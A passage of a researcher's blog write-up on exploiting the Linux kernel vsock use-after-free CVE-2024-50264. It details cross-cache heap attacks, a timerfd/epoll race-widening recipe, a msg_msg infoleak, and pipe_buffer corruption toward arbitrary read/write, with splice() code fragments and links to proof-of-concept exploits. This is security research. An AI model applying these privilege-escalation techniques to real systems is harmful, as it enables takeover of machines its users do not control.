+  <li><code>drill_test.c</code> is a userspace test for <code>drill_mod.ko</code> that provides the examples of using <code>/proc/drill_act</code>. This test doesn't provoke memory corruptions in <code>drill_mod.ko</code> and it passes if <code>CONFIG_KASAN=y</code>.</li>
+  <li><code>README.md</code> includes a detailed step-by-step setup guide on how to use <code>kernel-hack-drill</code> (kudos to the contributors!).</li>
+</ul>
+
+<p>Fun fact: when I chose the name <code>kernel-hack-drill</code> for this project, I used the word <code>drill</code> to mean <code>training</code> or <code>workout</code> for Linux kernel security. My friends and students read it differently. They thought I meant something like this:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/drill_tux.jpg" width="60%"></center>
+
+
+<p>The <code>kernel-hack-drill</code> project is a bit similar to <a href="https://github.com/hacktivesec/KRWX">KRWX</a>, but much simpler. Moreover, it ships with ready-made PoC exploits:</p>
+<ul>
+  <li><code>drill_uaf_callback.c</code>: a UAF exploit that invokes a callback inside a freed <code>drill_item_t</code> structure. It hijacks control flow and gains LPE.</li>
+  <li><code>drill_uaf_w_msg_msg.c</code>: a UAF exploit that writes into a freed <code>drill_item_t</code>. It uses a cross-cache attack and overwrites <code>msg_msg.m_ts</code> enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.</li>
+  <li><code>drill_uaf_w_pipe_buffer.c</code>: a UAF exploit that writes into a freed <code>drill_item_t</code>. It performs a cross-cache attack and overwrites <code>pipe_buffer.flags</code> to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.</li>
+</ul>
+
+<p>Recent contributions added new variants (kudos to the contributors!):</p>
+<ul>
+  <li><code>drill_uaf_callback_rop_smep.c</code>: an improved version of <code>drill_uaf_callback.c</code> that adds a ROP chain to bypass SMEP on <code>x86_64</code>.</li>
+  <li><code>drill_uaf_w_pte.c</code>: a UAF exploit that writes to a freed <code>drill_item_t</code>. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on <code>x86_64</code>.</li>
+  <li><code>drill_uaf_w_pud.c</code>: an improved version of <code>__drill_uaf_w_pte.c__</code> that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.</li>
+</ul>
+
+<p>When I revisited <code>kernel-hack-drill</code> during my CVE-2024-50264 work, this spare-time project hadn't seen an update in years. But now <code>kernel-hack-drill</code> offers a solid set of resources that Linux kernel security researchers can explore.</p>
+
+<h2 id="experimenting-with-cross-cache-attack-using-kernel-hack-drill">Experimenting with cross-cache attack using kernel-hack-drill</h2>
+
+<p>My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.</p>
+
+<p>I implemented a standard cross-cache attack in <code>drill_uaf_w_msg_msg.c</code>. You can see <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_msg_msg.c">the full code in the repository</a>, so I'll sketch the flow here. For background, I highly recommend <a href="https://xairy.io/about">Andrey Konovalov</a>'s talk <a href="https://www.youtube.com/watch?v=2hYzxsWeNcE">SLUB Internals for Exploit Developers</a>.</p>
+
+<p>To plan the attack, I pulled the needed info from <code>/sys/kernel/slab</code>. The slab caches that hold <code>virtio_vsock_sock</code> (80 bytes) or <code>drill_item_t</code> (95 bytes) each keep 120 slabs in per-CPU partial lists (<code>cpu_partial=120</code>) and 42 objects in each slab (<code>objs_per_slab=42</code>).</p>
+
+<p>The cross-cache attack algorithm:</p>
+<ol>
+  <li>Allocate <code>objs_per_slab</code> objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.</li>
+  <li>Allocate <code>objs_per_slab * cpu_partial</code> objects. This creates the <code>cpu_partial</code> number of full slabs that will later populate the partial list at step 6.</li>
+  <li>Create a slab that contains the UAF object. Allocate <code>objs_per_slab</code> objects and keep a dangling reference to the vulnerable object in that slab.</li>
+  <li>Create a new active slab again: allocate <code>objs_per_slab</code> objects. This step is <strong>very important</strong> for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.</li>
+  <li>Completely free the slab that holds the UAF object. To do that, free <code>(objs_per_slab * 2 - 1)</code> of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.</li>
+  <li>Fill up the partial list: free one of each <code>objs_per_slab</code> objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.</li>
+  <li>Reclaim the page that contained the UAF object for another slab cache: spray the target <code>msg_msg</code> objects. As a result, one <code>msg_msg</code> is allocated where the vulnerable object (<code>drill_item_t</code> in my case) used to be.</li>
+  <li>Exploit the UAF! Overwrite <code>msg_msg.m_ts</code> to read kernel memory out of bounds.</li>
+</ol>
+
+<p>I've seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I'll fill that gap.</p>
+
+<p>Let's examine the <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_msg_msg.c">attack</a> in <code>drill_uaf_w_msg_msg.c</code>. To watch it in action and debug it, make the following tweaks in your kernel sources:</p>
+<div><pre><code><span>diff --git a/mm/slub.c b/mm/slub.c
+index be8b09e09d30..e45f055276d1 100644
+</span><span>--- a/mm/slub.c
+</span><span>+++ b/mm/slub.c
+</span><span>@@ -3180,6 +3180,7 @@</span> static void __put_partials(struct kmem_cache *s, struct slab *partial_slab)
+        while (slab_to_discard) {
+                slab = slab_to_discard;
+                slab_to_discard = slab_to_discard-&gt;next;
+<span>+               printk("__put_partials: cache 0x%lx slab 0x%lx\n", (unsigned long)s, (unsigned long)slab);
+</span> 
+                stat(s, DEACTIVATE_EMPTY);
+                discard_slab(s, slab);
+
+diff --git a/ipc/msgutil.c b/ipc/msgutil.c
+<span>index c7be0c792647..21af92f531d6 100644
+</span><span>--- a/ipc/msgutil.c
+</span><span>+++ b/ipc/msgutil.c
+</span><span>@@ -64,6 +64,7 @@</span> static struct msg_msg *alloc_msg(size_t len)
+        msg = kmem_buckets_alloc(msg_buckets, sizeof(*msg) + alen, GFP_KERNEL);
+        if (msg == NULL)
+                return NULL;
+<span>+       printk("msg_msg 0x%lx\n", (unsigned long)msg);
+</span> 
+        msg-&gt;next = NULL;
+        msg-&gt;security = NULL;
+</code></pre></div>
+
+<p>In <code>__put_partials()</code> I print the address of the slab that returns to the page allocator when <code>discard_slab()</code> runs. In <code>alloc_msg()</code> I print the kernel address of each newly allocated <code>msg_msg</code> object.</p>
+
+<p>When the cross-cache attack succeeds, the slab that held <code>drill_item_t</code> objects is handed back to the page allocator and then reused for <code>msg_msg</code> objects. Running the PoC exploit <code>drill_uaf_w_msg_msg</code> makes this visible, as we observe:</p>
+<ul>
+  <li>In the kernel log:
+    <div><pre><code>[   32.719582] drill: kmalloc'ed item 5123 (0xffff88800c960660, size 95)
+</code></pre></div>
+  </li>
+  <li>Then in stdout:
+    <div><pre><code>[+] done, current_n: 5124 (next for allocating)
+[!] obtain dangling reference from use-after-free bug
+[+] done, uaf_n: 5123
+</code></pre></div>
+  </li>
+  <li>Then in GDB (using with <a href="https://github.com/bata24/gef">bata24/gef</a>):
+    <div><pre><code>gef&gt; slab-contains 0xffff88800c960660
+[+] Wait for memory scan
+slab: 0xffffea0000325800
+kmem_cache: 0xffff888003c45300
+base: 0xffff88800c960000
+name: kmalloc-rnd-05-96  size: 0x60  num_pages: 0x1
+</code></pre></div>
+  </li>
+  <li>Finally, in the kernel log:
+    <div><pre><code>[   36.778165] drill: free item 5123 (0xffff88800c960660)
+...
+[   36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800
+...
+[   36.892053] msg_msg 0xffff88800c960660
+</code></pre></div>
+  </li>
+</ul>
+
+<p>We see the <code>drill_item_t</code> object <code>0xffff88800c960660</code> in slab <code>0xffffea0000325800</code> reallocated as <code>msg_msg</code>, which confirms that the cross-cache attack worked.</p>
+
+<p>After experimenting with <code>kernel-hack-drill</code> on Ubuntu Server 24.04, I found that <code>CONFIG_RANDOM_KMALLOC_CACHES</code> and <code>CONFIG_SLAB_BUCKETS</code> block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/slab_hardening.jpg" width="60%"></center>
+
+
+<p>It seems that, without a mitigation such as <a href="https://lore.kernel.org/all/20230915105933.495735-15-matteorizzo@google.com/">SLAB_VIRTUAL</a>, the Linux kernel remains wide-open to cross-cache attacks.</p>
+
+<h2 id="adapting-the-cross-cache-attack-to-cve-2024-50264">Adapting the cross-cache attack to CVE-2024-50264</h2>
+
+<p>As noted in the limitations, the vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object (<strong>Limitation #1</strong>). That hurts the exploit for two reasons:</p>
+<ul>
+  <li>On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.</li>
+  <li>On the other hand, closing the server vsock disturbs the UAF itself.</li>
+</ul>
+
+<p>How to deal with it? @v4bel and @qwerty used the <a href="https://github.com/IAIK/SLUBStick">SLUBStick</a> timing side channel to spot when the allocator switched to a new active slab. I went another way:</p>
+<blockquote>
+  <p>What if I hit the <code>connect()</code> syscall with a signal <strong>almost immediately</strong>?</p>
+</blockquote>
+
+<p>In short, I used <strong>one more race condition</strong> to exploit the main race condition – and it worked:</p>
+<ul>
+  <li>I sent the "immortal" signal 33 to the vulnerable <code>connect()</code> syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.</li>
+  <li>Then I verified the early race condition:
+    <ol>
+      <li>The <code>connect()</code> syscall must return "Interrupted system call"</li>
+      <li>Another testing client vsock should still connect to the server vsock without trouble</li>
+    </ol>
+  </li>
+</ul>
+
+<p>I discovered that when both checks passed, only a single vulnerable <code>virtio_vsock_sock</code> for the client vsock was created. The interrupting signal arrived before the kernel could create the second <code>virtio_vsock_sock</code> for the server vsock. This bypassed <strong>Limitation #1</strong> (paired-object creation). After that, I sent signal 33 again – this time after the normal timeout – to interrupt the vulnerable <code>connect()</code> a second time and provoke the UAF. The cross-cache attack against <code>virtio_vsock_sock</code> was unlocked!</p>
+
+<p>Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in <strong>Limitation #2</strong>. My race condition "speedrun" also eased <strong>Limitation #5</strong>: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at <code>VSOCK_CLOSE_TIMEOUT</code> (8 seconds).</p>
+
+<p>To address <strong>Limitation #4</strong> (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering <code>connect()</code>, I called <code>listen()</code> on the vulnerable vsock. If <code>listen()</code> ran before the kworker, it changed the vsock state to <code>TCP_LISTEN</code>, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.</p>
+
+<p>At that point my list of CVE-2024-50264 limitations looked like this:</p>
+<ol>
+  <li><del>The vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.</del></li>
+  <li><del>Reproducing this race condition is very unstable.</del></li>
+  <li><strong>The UAF write occurs in a kworker a few microseconds after <code>kfree()</code>, too quickly for typical cross-cache attacks.</strong></li>
+  <li><del>A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.</del></li>
+  <li><del>Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after <code>VSOCK_CLOSE_TIMEOUT</code> (eight seconds).</del></li>
+  <li><strong>The kworker hangs in <code>spin_lock_bh()</code> if <code>virtio_vsock_sock.tx_lock</code> is not zero.</strong></li>
+</ol>
+
+<p>With the early-signal trick in place, only two limitations were still blocking my exploit.</p>
+
+<h2 id="oh-so-slow-the-cross-cache-attack-shows-up-late-to-the-party">Oh so slow! The cross-cache attack shows up late to the party</h2>
+
+<p>As noted in <strong>Limitation #3</strong>, the UAF write in the kworker fires only a few μs after <code>kfree()</code> for the <code>virtio_vsock_sock</code>. A cross-cache attack needs much more time, so the UAF write lands on the original <code>virtio_vsock_sock</code> and never reaches the <code>msg_msg</code>.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_and_cross_cache.jpeg" width="50%"></center>
+
+
+<p>I didn't know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn's article <a href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clock</a>. It allowed to make my kworker slower than a sluggish cross-cache attack.</p>
+
+<p>The main idea is to hammer the kworker with a <code>timerfd</code> watched by a huge pile of <code>epoll</code> instances. Here is the short recipe (see <a href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Jann's article</a> for full detail):</p>
+<ol>
+  <li>Call <code>timerfd_create(CLOCK_MONOTONIC, 0)</code>.</li>
+  <li>Create 8 forks.</li>
+  <li>In each fork, call <code>dup()</code> for the <code>timerfd</code> 100 times.</li>
+  <li>In each fork, call <code>epoll_create()</code> 500 times.</li>
+  <li>For every <code>epoll</code> instance, use <code>epoll_ctl()</code> to add all duplicated file descriptors to the interest list – each <code>epoll</code> instance now monitors all available <code>timerfd</code> copies.</li>
+  <li>Finally, arm the <code>timerfd</code> so the interrupt hits the kworker at just the right moment:
+    <div><pre><code><span>timerfd_settime</span><span>(</span><span>timerfd</span><span>,</span> <span>TFD_TIMER_CANCEL_ON_SET</span><span>,</span> <span>&amp;</span><span>retard_tmo</span><span>,</span> <span>NULL</span><span>)</span>
+</code></pre></div>
+  </li>
+</ol>
+
+<p>This procedure made my race-condition window around 80 times longer.</p>
+
+<p>I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in <code>/proc/sys/fs/epoll/max_user_watches</code>, <code>epoll_ctl()</code> fails. From <code>man 7 epoll</code>:</p>
+<blockquote>
+  <p>This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.</p>
+</blockquote>
+
+<p>On Ubuntu Server 24.04 with 2 GiB of RAM, <code>/proc/sys/fs/epoll/max_user_watches</code> is 431838, which is not huge. I could afford 8 forks × 500 <code>epoll</code> instances × 100 duplicated file descriptors, for a total of 400000 <code>epoll</code> watches.</p>
+
+<p>That was just enough to beat <strong>Limitation #3</strong>, and I finally got <code>msg_msg</code> data size corruption: the vsock UAF changed <code>msg_msg.m_ts</code> from 48 bytes to 8192 (<code>MSGMAX</code>). Now I could do out-of-bounds reading of the kernel memory using the <code>msgrcv()</code> syscall.</p>
+
+<h2 id="sorting-the-loot">Sorting the loot</h2>
+
+<p>The corrupted <code>msg_msg</code> allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address <code>0xffffffff8233cfa0</code> [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the <code>socket_file_ops()</code> kernel function. I was excited to discover that this function pointer is part of <code>struct file</code>, because the <code>file</code> kernel object also contains the <code>f_cred</code> pointer [2], which leaked as well.</p>
+
+<p>Here's how I examined the memory leaked by <code>msg_msg</code> at <code>0xffff88800e75d600</code>:</p>
+<div><pre><code>gef&gt; p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
+$61 = {
+  f_count = {
+    counter = 0x0
+  },
+  f_lock = {
+    {
+      rlock = {
+        raw_lock = {
+          {
+            val = {
+              counter = 0x0
+            },
+            {
+              locked = 0x0,
+              pending = 0x0
+            },
+            {
+              locked_pending = 0x0,
+              tail = 0x0
+            }
+          }
+        }
+      }
+    }
+  },
+  f_mode = 0x82e0003,
+  f_op = 0xffffffff8233cfa0 &lt;socket_file_ops&gt;,    [1]
+  f_mapping = 0xffff88800ee66f60,
+  private_data = 0xffff88800ee66d80,
+  f_inode = 0xffff88800ee66e00,
+  f_flags = 0x2,
+  f_iocb_flags = 0x0,
+  f_cred = 0xffff888003b7ad00,                    [2]
+  f_path = {
+    mnt = 0xffff8880039cec20,
+    dentry = 0xffff888005b30b40
+  },
+  ...
+</code></pre></div>
+
+<p>As a result, my PoC exploit obtained a pointer to <code>struct cred</code>, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.</p>
+
+<h2 id="in-search-of-arbitrary-address-writing-primitive">In search of arbitrary address writing primitive</h2>
+
+<p>The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I've done the following:</p>
+<ul>
+  <li>Looked through dozens of kernel objects,</li>
+  <li>Read many kernel exploit write-ups,</li>
+  <li>Tried <a href="https://kernelctf-dash.storage.googleapis.com/processed/v6.1.111/index.html#!heap/*/msg_msg/64..128">Kernel Exploitation Dashboard</a> by Eduardo Vela and the KernelCTF team.</li>
+</ul>
+
+<p>One idea was to combine my limited UAF write with the Dirty Page Table attack (<a href="https://web.archive.org/web/20250226150503/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">well described</a> by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.</p>
+
+<p>I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:</p>
+<ol>
+  <li>Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.</li>
+  <li>Using the KASLR infoleak from my <code>msg_msg</code> out-of-bounds read. I decided to try that.</li>
+</ol>
+
+<p>I ran a quick experiment to see how KASLR behaves on <code>X86_64</code> with <code>CONFIG_RANDOMIZE_BASE</code> and <code>CONFIG_RANDOMIZE_MEMORY</code> enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel <code>_text</code>.</p>
+
+<p>VM run #1:</p>
+<div><pre><code>gef&gt; ksymaddr-remote
+[+] Wait for memory scan
+0xffffffff98400000 T _text
+
+gef&gt; v2p 0xffffffff98400000
+Virt: 0xffffffff98400000 -&gt; Phys: 0x57400000
+</code></pre></div>
+
+<p>VM run #2:</p>
+<div><pre><code>gef&gt; ksymaddr-remote
+[+] Wait for memory scan
+0xffffffff81800000 T _text
+
+gef&gt; v2p 0xffffffff81800000
+Virt: 0xffffffff81800000 -&gt; Phys: 0x18600000
+</code></pre></div>
+
+<p>Then I calculated the difference between the virtual and physical addresses:</p>
+<ul>
+  <li>VM run #1: <code>0xffffffff98400000 − 0x57400000 = 0xffffffff41000000</code></li>
+  <li>VM run #2: <code>0xffffffff81800000 − 0x18600000 = 0xffffffff69200000</code></li>
+</ul>
+
+<p>Because <code>0xffffffff41000000</code> is not equal to <code>0xffffffff69200000</code>, leaking the virtual KASLR offset doesn't help against physical KASLR.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/kaslr.jpg" width="60%"></center>
+
+
+<p>Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.</p>
+
+<p>I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on <code>pipe_buffer</code>.</p>
+
+<p>When a pipe is created with the <code>pipe()</code> system call, the kernel allocates an array of <code>pipe_buffer</code> structures. Each <code>pipe_buffer</code> item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/pipe_buffer.png" width="50%"></center>
+
+
+<p>This object looked like a good UAF target. I could make a <code>pipe_buffer</code> array the same size as <code>virtio_vsock_sock</code> by changing the capacity of the pipe: <code>fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2)</code>. The kernel changes the array size to <code>2 * sizeof(struct pipe_buffer) = 80 bytes</code>, exactly matching the <code>virtio_vsock_sock</code> size.</p>
+
+<p>In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip <code>pipe_buffer.flags</code>, just as in Max Kellermann's original <a href="https://dirtypipe.cm4all.com/">Dirty Pipe attack</a>.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer0.png" width="90%"></center>
+
+
+<p>The original Dirty Pipe attack doesn't even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with <code>pipe_buffer</code> in my <code>kernel-hack-drill</code>.</p>
+
+<h2 id="experimenting-with-the-dirty-pipe-attack">Experimenting with the Dirty Pipe attack</h2>
+
+<p>First, I built a Dirty Pipe prototype in <code>kernel-hack-drill</code>; the PoC exploit <code>drill_uaf_w_pipe_buffer.c</code> is in the <a href="https://github.com/a13xp0p0v/kernel-hack-drill/blob/e3a105cde99912c89c2c1470a29101eb0d9c2d56/drill_uaf_w_pipe_buffer.c">repository</a>. It:</p>
+<ol>
+  <li>performs a cross-cache attack and reclaims the slab that held <code>drill_item_t</code> objects as a slab for <code>pipe_buffer</code> objects</li>
+  <li>exploits the UAF write to <code>drill_item_t</code>; the attacker-controlled bytes written to <code>drill_item_t</code> at offset 24, modify <code>pipe_buffer.flags</code></li>
+  <li>implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!</li>
+</ol>
+
+<p>To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining <strong>Limitation #6</strong>: the kworker hangs before the UAF write if <code>virtio_vsock_sock.tx_lock</code> is non-zero. I managed to solve that by doing <code>splice()</code> from a regular file to the pipe, starting at offset zero:</p>
+<div><pre><code>	<span>loff_t</span> <span>file_offset</span> <span>=</span> <span>0</span><span>;</span>
+	<span>ssize_t</span> <span>bytes</span> <span>=</span> <span>0</span><span>;</span>
+
+	<span>/* N.B. splice modifies the file_offset value */</span>
+	<span>bytes</span> <span>=</span> <span>splice</span><span>(</span><span>temp_file_fd</span><span>,</span> <span>&amp;</span><span>file_offset</span><span>,</span> <span>pipe_fd</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>);</span>
+	<span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
+		<span>err_exit</span><span>(</span><span>"[-] splice"</span><span>);</span>
+	<span>if</span> <span>(</span><span>bytes</span> <span>!=</span> <span>1</span><span>)</span>
+		<span>err_exit</span><span>(</span><span>"[-] splice short"</span><span>);</span>
+</code></pre></div>
+
+<p>In that case, the <code>pipe_buffer.offset</code> field remains zero, so the kworker does not hang while acquiring the spinlock:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer2.png" width="90%"></center>
+
+
+<p>This seemed like a breakthrough – until I noticed that the UAF write also corrupted the <code>pipe_buffer.ops</code> function pointer by four zero bytes of <code>peer_fwd_cnt</code>. That unfortunate side effect provoked kernel crashes on every later operation involving <code>pipe_buffer</code> ☹️:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer3.png" width="90%"></center>
+
+
+<p>This brought me to the following line of reasoning:</p>
+<ol>
+  <li>Completing the Dirty Pipe attack requires a working <code>pipe_buffer</code> with an unchanged <code>ops</code> pointer value.</li>
+  <li>Preserving <code>0xffffffff</code> in the most significant bytes of the <code>pipe_buffer.ops</code> function pointer requires that same value in <code>peer_fwd_cnt</code>.</li>
+  <li>Setting <code>peer_fwd_cnt</code> in <code>virtio_vsock_sock</code> means sending data through the vsock.</li>
+  <li>Sending data through a vsock first needs a successful <code>connect()</code>.</li>
+  <li>However, a successful <code>connect()</code> on the vulnerable vsock makes the UAF impossible ⛔.</li>
+</ol>
+
+<p>Alas!</p>
+
+<h2 id="pipe-buffer-entertainment">Pipe buffer entertainment</h2>
+
+<p>So the original Dirty Pipe technique wouldn't fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:</p>
+<blockquote>
+  <p>What if I create a pipe with capacity <code>PAGE_SIZE * 4</code> forcing the kernel to allocate four <code>pipe_buffer</code> objects in <code>kmalloc-192</code>?</p>
+</blockquote>
+
+<p>In that case, the memory object overlapping looked like this: four <code>pipe_buffer</code> objects in one <code>kmalloc-192</code> slab are allocated at the place of two <code>virtio_vsock_sock</code> objects in two <code>kmalloc-96</code> slabs. The following diagram illustrates the overlap:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer7.png" width="90%"></center>
+
+
+<p>Here, memory corruption can land on either of the two <code>virtio_vsock_sock</code> objects. I'll cover these cases one at a time.</p>
+
+<p>To avoid the kernel hang and crash when the UAF hits <code>virtio_vsock_sock</code> <strong>#1</strong>, I used two tricks:</p>
+<ol>
+  <li>Performed a <code>splice()</code> from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the <code>offset</code> field of the first <code>pipe_buffer</code> at zero, so the kworker doesn't hang while acquiring the spinlock.</li>
+  <li>Discarded that first <code>pipe_buffer</code> <strong>before triggering the UAF</strong>, leaving its <code>offset</code> field untouched:
+    <div><pre><code> <span>/* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */</span>
+ <span>bytes</span> <span>=</span> <span>splice</span><span>(</span><span>pipe_fd</span><span>[</span><span>0</span><span>],</span> <span>NULL</span><span>,</span> <span>temp_pipe_fd</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>);</span>
+ <span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
+ 	<span>err_exit</span><span>(</span><span>"[-] splice"</span><span>);</span>
+ <span>if</span> <span>(</span><span>bytes</span> <span>==</span> <span>0</span><span>)</span>
+ 	<span>err_exit</span><span>(</span><span>"[-] splice short"</span><span>);</span>
+
+ <span>/*
+  * Let's read this byte and empty the first pipe_buffer.
+  * So if the UAF writing corrupts the first pipe_buffer,
+  * that will not crash the kernel. Cool!
+  */</span>
+ <span>bytes</span> <span>=</span> <span>read</span><span>(</span><span>temp_pipe_fd</span><span>[</span><span>0</span><span>],</span> <span>pipe_data_to_read</span><span>,</span> <span>1</span><span>);</span> <span>/* 1 spliced byte */</span>
+ <span>if</span> <span>(</span><span>bytes</span> <span>&lt;</span> <span>0</span><span>)</span>
+ 	<span>err_exit</span><span>(</span><span>"[-] pipe read 1"</span><span>);</span>
+ <span>if</span> <span>(</span><span>bytes</span> <span>!=</span> <span>1</span><span>)</span>
+ 	<span>err_exit</span><span>(</span><span>"[-] pipe read 1 short"</span><span>);</span>
+</code></pre></div>
+    <p>After this sequence of <code>splice()</code> and <code>read()</code>, the first <code>pipe_buffer</code> becomes inactive. Even if the subsequent UAF overwrites its <code>ops</code> pointer, later pipe operations won't dereference that corrupted pointer, so no kernel crash occurs.</p>
+  </li>
+</ol>
+
+<p>I wanted to exploit the UAF on <code>virtio_vsock_sock</code> <strong>#2</strong> to overwrite the fourth <code>pipe_buffer</code>. To prevent the kernel hang when the UAF hits this second <code>virtio_vsock_sock</code>, I called the same <code>splice(temp_file_fd, &amp;file_offset, pipe_fd[1], NULL, 1, 0)</code> two more times. These syscalls initialized the second and third <code>pipe_buffer</code> objects, leaving their <code>flags</code> at zero, since this pipe operation doesn't set any <code>PIPE_BUF_FLAG_*</code> bits. Therefore, if the UAF occurs on the second <code>virtio_vsock_sock</code>, the <code>spin_lock_bh()</code> in <code>virtio_transport_space_update()</code> will not hang.</p>
+
+<p>These preparations of the pipe opened a door for corrupting the <code>page</code> pointer of the fourth <code>pipe_buffer</code>:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_pipe_buffer6.png" width="90%"></center>
+
+
+<p><code>kernel-hack-drill</code> let me experiment with <code>pipe_buffer</code> objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.</p>
+
+<h2 id="aarw-and-kaslrs-last-revenge">AARW and KASLR's last revenge</h2>
+
+<p>In a <code>pipe_buffer</code>, the <code>page</code> pointer holds the address of a <code>struct page</code> inside the virtual memory map (<code>vmemmap</code>). <code>vmemmap</code> is an array of these structures that allows the kernel to address physical memory efficiently. It is <a href="https://elixir.bootlin.com/linux/v6.15.5/source/Documentation/arch/x86/x86_64/mm.rst">mentioned</a> in <code>Documentation/arch/x86/x86_64/mm.rst</code>:</p>
+<div><pre><code>____________________________________________________________|___________________________________________________________
+                  |            |                  |         |
+ ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
+ ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
+ ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
+ ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
+ ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
+ ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
+ ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
+ ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
+ ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
+__________________|____________|__________________|_________|____________________________________________________________
+</code></pre></div>
+
+<p>Hence, when I managed to perform a UAF write of controlled data to the <code>pipe_buffer.page</code> pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn't able to change the AARW target address many times, as I mentioned in <strong>Limitation #5</strong>, so I had to choose the target in <code>vmemmap</code> carefully.</p>
+
